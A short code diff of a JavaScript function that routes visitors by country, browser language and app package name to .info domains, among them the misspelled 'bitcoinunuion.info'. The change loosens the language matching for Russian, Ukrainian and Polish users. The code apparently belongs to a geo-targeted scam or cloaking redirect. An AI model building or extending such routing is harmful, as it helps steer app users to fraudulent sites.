@@ -113,14 +113,9 @@ function checkCountry(ip, language, app) {
             countryCode === "UK" || countryCode === "HK") {
             url = 'bitcoinunuion.info'
         } else if (countryCode === 'RU' || countryCode === "UA" || countryCode === "PL") {
-            if (language.toUpperCase() ==='RU' ||
-                language.toUpperCase() ==='UA' ||
-                language.toUpperCase() ==='RU-UA' ||
-                language.toUpperCase() ==='RU-RU' ||
-                language.toUpperCase() ==='EN-UA' ||
-                language.toUpperCase() ==='EN-RU' ||
-                language.toUpperCase() ==='EN-PL' ||
-                language.toUpperCase() ==='PL') {
+            if (language.toUpperCase().includes('RU') ||
+                language.toUpperCase().includes('UA') ||
+                language.toUpperCase().includes('PL')) {
                 if (app === 'com.appside.polishnewsapp') {
                     url = 'pulsbihzdnmnesu.info'
                 } else {
